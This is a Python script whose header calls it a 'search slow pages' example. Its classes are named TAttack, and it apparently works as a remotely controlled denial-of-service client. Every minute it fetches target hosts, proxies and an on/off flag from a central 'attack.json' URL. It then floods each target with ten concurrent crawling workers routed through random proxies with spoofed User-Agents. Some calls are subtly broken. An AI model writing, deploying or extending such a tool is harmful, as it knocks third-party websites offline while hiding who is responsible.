#!/usr/bin/python3 -B

'''
Python async
Search slow pages example
VladVons@gmail.com
2022.03.06
'''

import os
import time
import random
import asyncio
import aiohttp
import json
from datetime import datetime
from urllib.parse import urlparse
from aiohttp_socks import ProxyConnector
from bs4 import BeautifulSoup


__version__ = 'VladVons@gmail.com, v1.01, 2022.03.06'

MaxTasks = 10
MasterUrl = 'http://vpn2.oster.com.ua/www/temp/attack.json'


class TAttack():
    def __init__(self, aParent, aUrlRoot: str):
        self.Parent = aParent
        self.UrlRoot = aUrlRoot

        self.Urls = []
        self.TotalData = 0
        self.UrlDone = 0

        self.Sleep = 1
        self.LogFile = 'L_' + urlparse(self.UrlRoot).hostname + '.log'

        self.Queue = asyncio.Queue()
        self.Queue.put_nowait(aUrlRoot)

        self.Event = asyncio.Event()
        self.Wait(False)

    def _Log(self, aData: str):
        Time = datetime.now().strftime("%H:%M:%S")
        Data = Time + ' ' + aData
        print(Data)
        with open(self.LogFile, 'a+') as hFile:
            hFile.write(Data + '\n')

    async def _DoGrab(self, aUrl: str, aSoup, aStatus: int, aTaskId: int):
        raise NotImplementedError()

    def _GetHeaders(self) -> dict:
        OSs = ['Macintosh; Intel Mac OS X 10_15_5', 'Windows NT 10.0; Win64; x64; rv:77', 'Linux; Intel Ubuntu 20.04']
        Browsers = ['Chrome/83', 'Firefox/77', 'Opera/45']

        return {
            'Accept': '*/*',
            'User-Agent': 'Mozilla/5.0 (%s) %s' % (random.choice(OSs), random.choice(Browsers))
        }

    def _GetConnector(self) -> ProxyConnector:
        Proxies = self.Parent.Loader.Data['proxies']
        if (Proxies):
            return ProxyConnector.from_url(random.choice(Proxies))

    async def _GrabHref(self, aUrl: str, aData: str, aStatus: int, aTaskId: int, aDuration: float):
        self.TotalData += len(aData)
        self.UrlDone += 1

        Soup = BeautifulSoup(aData, "lxml")
        for A in Soup.find_all("a"):
            Href = A.get("href", '').strip().rstrip('/')
            if (Href):
                Path = urlparse(Href).path
                Ext = os.path.splitext(Path)[1]

                if (Href.startswith('/')):
                    Href = self.UrlRoot + Href

                if (Href.startswith(self.UrlRoot)) and \
                   (not Href.startswith('#')) and \
                   (not Ext in ['.zip', '.jpg', '.png']) and \
                   (not Href in self.Urls):
                    self.Urls.append(Href)
                    self.Queue.put_nowait(Href)
        await self._DoGrab(aUrl, aStatus, aTaskId, aDuration)

    async def _Worker(self, aTaskId: int):
        await asyncio.sleep(aTaskId)

        while (True):
            await self.Event.wait()
            await asyncio.sleep(self.Sleep)

            if (self.Queue.empty()):
                break
            Url = await self.Queue.get()

            try:
                async with aiohttp.ClientSession(connector=self._GetConnector()) as Session:
                    TimeStart = time.time()
                    async with Session.get(Url, headers=self._GetHeaders()) as Response:
                        Data = await Response.read()
                        await self._GrabHref(Url, Data, Response.status, aTaskId, time.time() - TimeStart)
            except (aiohttp.ClientConnectorError, aiohttp.ClientError) as E:
                    self._Log('Err:%s, %s', (E, Url))
            except Exception as E:
                print('Err', E, Url)

    def Wait(self, aEnable: bool):
        if (aEnable):
            self.Event.clear()
        else:
            self.Event.set()

    async def Run(self, aMaxTasks: int):
        Tasks = [asyncio.create_task(self._Worker(i)) for i in range(aMaxTasks)]
        await asyncio.gather(*Tasks)


class TAttackLog(TAttack):
    async def _DoGrab(self, aUrl: str, aStatus: int, aTaskId: int, aDuration: float):
        Msg = 'task:%d, status:%d, found:%d, done:%d, total:%dM, duration:%.3f, %s;' % (aTaskId, aStatus, len(self.Urls), self.UrlDone, self.TotalData / 1000000, aDuration, aUrl)
        self._Log(Msg)
 
  
class TLoader():
    def __init__(self):
        self.Data = {}

    async def FromUrl(self, aUrl: str) -> dict:
        try:
            async with aiohttp.ClientSession() as Session:
                async with Session.get(aUrl) as Response:
                    Data = await Response.read()
                    if (Data):
                        return self._Check(Data.decode())
        except Exception as E:
            print('Err. TMain.LoadUrl()', E)

    def FromFile(self, aFile: str) -> dict:
       with open(aFile, 'r') as hFile:
            return self._Check(hFile.read())

    def _Check(self, aData: str) -> bool:
        if (aData):
            Data = json.loads(aData)
            if (self.Data != Data):
                self.Data = Data
                return True


class TMain():
    def __init__(self):
        self.Tasks = []
        self.Task_Create = None
        self.Loader = TLoader()

    async def Create(self, aUrls: list):
        for Url in aUrls:
            Attack = TAttackLog(self, Url)
            Task = asyncio.create_task(Attack.Run(MaxTasks))
            self.Tasks.append([Attack, Task])

    def Cancel(self):
        for Attack, Task in self.Tasks:
            Task.cancel()
            del Attack
        self.Tasks = []

    def Wait(self, aEnable: bool):
        for Attack, Task in self.Tasks:
            Attack.Wait(aEnable)

    async def Run(self):
        while (True):
            if (await self.Loader.FromUrl(MasterUrl)):
                self.Wait(not self.Loader.Data['run'])

                self.Cancel()
                await asyncio.sleep(1)

                if (self.Task_Create):
                    self.Task_Create.cancel()
                self.Task_Create = asyncio.create_task(self.Create(self.Loader.Data['hosts']))

            await asyncio.sleep(60)


print(__version__)
asyncio.run(TMain().Run())
